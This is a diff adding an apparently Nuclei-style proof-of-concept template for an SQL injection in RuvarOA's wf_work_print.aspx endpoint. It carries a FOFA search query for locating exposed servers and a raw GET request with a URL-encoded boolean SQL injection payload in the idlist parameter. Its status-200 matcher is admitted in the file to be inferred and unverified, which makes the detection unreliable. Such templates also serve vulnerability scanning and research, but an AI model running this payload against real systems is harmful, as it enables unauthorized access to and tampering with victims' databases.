@@ -1,0 +1,60 @@
+id: poc-e1618288450b78294e68
+info:
+  name: RuvarOAwf_work_print存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/e1618288450b78294e689ff4bc455bf1
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: e1618288450b78294e689ff4bc455bf1
+    fofa: + fofa`body="txt_admin_key"`
+http:
+- raw:
+  - 'GET /WorkFlow/wf_work_print.aspx?idlist=%28SELECT+CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%288593%3D8593%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28113%29%29 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    DNT: 1
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: en-US,en;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /WorkFlow/wf_work_print.aspx?idlist=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    DNT: 1
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: en-US,en;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
